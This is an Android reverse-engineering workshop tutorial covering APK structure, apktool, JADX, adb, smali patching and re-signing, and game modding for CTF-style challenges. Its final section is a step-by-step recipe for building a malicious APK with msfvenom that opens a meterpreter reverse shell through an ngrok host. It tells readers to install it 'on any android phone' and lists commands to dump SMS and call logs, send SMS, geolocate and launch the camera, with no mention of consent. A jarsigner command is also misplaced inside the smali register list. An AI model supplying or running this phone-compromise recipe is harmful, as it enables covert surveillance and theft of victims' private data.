# Android Reversing

**Contents** 

* Structure and working of an android app
* Some tools
* Java Decompiler
* Smali basics
* Hacking android games!
* Hacking a real android phone!!

## Let's start
* .apk (android application package) is the file format used for android applications. It is basically a kind of zip archive. An apk is made up of the manifest (`AndroidManifest.xml`), .dex files, native libraries and assets.

* JVM and DVM
In desktop applications, the Java code is run in the Java Virtual Machine(JVM). No doubt, JVM is really awesome but it is too heavy for low memory devices. To tackle this problem, the `DVM (Dalvik Virtual Machine)` was built which even works on low memory devices and is faster than the `JVM`.  DVM executes the Dalvik bytecode. 

* Main difference between JVM and DVM : JVM is a stack based virtual machine where all the arithmetic and logic operations happen with the help of push and pop operations. DVM is a register based VM where CPU registers are used to perform all the arithmetic and logical operations. 

## AndroidManifest.xml
A file that contains important metadata about the android app such as `activity` names, `package` name, etc.

## lib
Native libraries are stored in this folder.

## META-INF
It contains the manifest information and some certificates. `CERT.SF` contains the list of all files alongwith
their sha1 digest. `CERT.RSA` contains the signed contents of the `CERT.SF` file along with the certificate chain of the public key used for signing the contents.

## classes.dex
It is the Dalvik bytecode for the application. In Android, Java is compiled to dex bytecode. Earlier, it was done by the DVM but nowadays, Android Runtime (ART) in used. 

## assets
This folder contains some additional files like an SQLite database file, or some other files needed by the app.

* package
In simple words, a package is a directory to which the source code belongs. For example,  `com.example.infosec`

* Activity
An activity represents a single screen with a user interface just like a window.

## Static Analysis
Analysis of the source code or the application without running it. Some tools used for static analysis are
`apktool`, `JADX`, `JD-GUI`, `dex2jar`.

JADX -> https://github.com/skylot/jadx

apktool -> https://github.com/iBotPeaches/Apktool


apktool decodes the resources and rebuilds them to make them human readable. apktool also generates a folder named smali which contains the smali code for different activities. 
Syntax: `apktool d appName.apk`
`JADX` can be used to get the Java source code from an apk, .class, .jar or a .dex file 


* The Launcher Activity
Applications that have a UI start with the LauncherActivity. It is an entrypoint to the application. For example, the following piece of code is present in the AndroidManifest.xml file
```
<activity android:name=".LauncherActivity">
	<intent-filter>
    	<action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>
```


* adb (Android Debug Bridge)
A command-line tool that lets you communicate with a device (such as an emulator). It can be used to install, uninstall and debug android apps.


Some adb commands :
```
adb devices   -> List the devices

After a device is connected to adb, run

adb install app.apk      -> to install tha app
adb uninstall <package>    -> to uninstall the app
adb push /path_to_file /some_path_in_the_device   -> push a file to the device
adb pull /some_path_in_the_device /path  -> pull a file from the device
adb shell    -> Get a shell on the device
adb logcat  -> View the logs
```

* Challenge -> n00bCTF (h3nth1gh)
The challenge file can be downloaded from https://github.com/0xSh4dy/Android_Sec/raw/files/h3nth1gh.apk


## smali and the Dalvik Bytecode
It is the human readable version of the Dalvik bytecode. smali looks like assembly instructions and is a bit difficult to understand. 


You would have studied about registers such as rip, rsp, rax, etc., while reversing ELF executables.
Just like that, registers are present here as well. But they have different names

```
v0 and v1 are local registers

v2 is the first parameter register
v3 is the second parameter register
v4 is the third parameter register
jarsigner -keystore <path to debug.keystore> -verbose -storepass android -keypass android -sigalg SHA1withDSA -digestalg SHA1 app.apk androiddebugkey
```


Smali instructions are used when you need to patch an android app easily(this method is used to develop mods of games and many other android apps). Checkout http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html to get a detailed explanation of Dalvik opcodes (smali instructions).

This is done as:
* Edit the smali instructions carefully 
* Rebuild the apk using apktool
* Sign the apk using keytool and jarsigner
* Run the app and see the magic!


Signing an apk is necessary after you rebuild it using apktool. To sign the apk, run the following commands:
We need to sign a certificate because android device cannot install applications without a properly signed certificate.

```
First of all, generate a key:

keytool -genkey -v -keystore debug.keystore -alias androiddebugkey -keyalg DSA -sigalg SHA1withDSA -keysize 1024 -validity 10000

Rebuild the apk after modifying smali instructions

apktool b ./folderName -o app_name.apk

Here, folderName is the folder that you get by running apktool d appname.apk 


jarsigner -keystore debug.keystore -verbose -storepass android -keypass android -sigalg SHA1withDSA -digestalg SHA1 app_name.apk androiddebugkey

```

Download the game from https://github.com/0xSh4dy/Android_Sec/raw/files/coinMan.apk

* Challenge -> CoinMan Game (patching a game to boost the score and disable all the bombs!)


Now, the most interesting part comes in: attacking real android phones.
# Metasploit Framework
Download it from https://github.com/rapid7/metasploit-framework

Now, we are gonna develop a simple malicious application that would give us a reverse shell on any android device on which the app is executed. You can write the malicious code yourself but many of you might not be familiar with Android development. No worries! There's a powerful exploitation and malware generation framework known as the `Metasploit Framework` which would generate a malicious app. 

Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.
The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.

## Modules
Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack.

## Auxiliary
Any supporting module, such as scanners, crawlers and fuzzers, can be found here.

## Encoders 
Encoders allow you to encode the exploit and the payload to bypass the antivirus mechanisms.

## Evasion
While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.

## Exploits
Piece of code to exploit a vulnerability.

## NOPs
NOPs (No Operation) do nothing, literally. They are represented in the Intel x86 CPU family they are represented with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.

## Payloads
Payload is the code that will run on the target system.


### Msfvenom
Msfvenom allows you to create payloads in many different formats (apk, php, exe, dll, elf, etc.) and for many different target systems ( Android, Linux, Apple, Windows etc.).

Download and setup `ngrok` (https://github.com/inconshreveable/ngrok).
Select any port that is not in use, let's say `9999`. Start ngrok to tunnel tcp traffic to the localhost with the port `9999`

```
ngrok tcp 9999
```
It will provide you a public host and a PORT. Note it down. Let's say,  `0.tcp.in.ngrok.io` and `11664`. Now, we are all set for generating the malicious apk.

To generate a simple, malicious application for getting a meterpreter shell, run the following command:
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<port> R > shell.apk

In this case, our host is 0.tcp.in.ngrok.io and the port is 11664. It might be different in your case.

So, I'll use the command

msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.in.ngrok.io LPORT=11664 R > shell.apk
```
It would generate an apk with the name shell.apk
Sign it using jarsigner (the same method used while rebuilding the apk using apktool)

Now, your malicious application is ready! Install it on any android phone.

## Msfconsole
It is a powerful, command line interface for the metasploit framework.
Launch the msfconsole (Simply, run the command `msfconsole`)

After the msfconsole is ready,
```
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 9999
run
```
Now, the msfconsole will be waiting for a reverse tcp connection from the target device. Execute the app on the target device and boom, you'll get a meterpreter shell

Note : Be careful while specifying the payload and the LPORT. LPORT must be the same port to which ngrok is tunneling traffing. For example, if you start ngrok by the command ngrok tcp 9999, the LPORT will be 9999. The payload must be the same payload that was used to generate the malicious apk.

Meterpreter commands (for android)

```
dump_sms  -> Dump the sms logs present on the target device

send_sms -d phone_number -t some_text_message             -> Send a SMS from the hacked device to the specified phone number

geolocate  -> Find the current coordinates of the device

sysinfo  -> Information about the target system

shell     -> Get an interactive shell on the target device

dump_calllog -> Dump the call logs present on the target device

app_list  -> List all the applications (with package names) present on the target

app_run package_name    -> Run an app present on the target (including the camera!!)

download /path/to/file   -> Download any file present on the target (you need to know the path)


Upcoming Workshops (to be declared)....

# Workshop 2:

* Native Libraries
* Using the power of `Frida JavaScript API` to patch apps at runtime.
* Sniffing Network Traffic


# Workshop 3:

* Android Architecture
* Rooting and Root Detection
* Android Exploitation using C


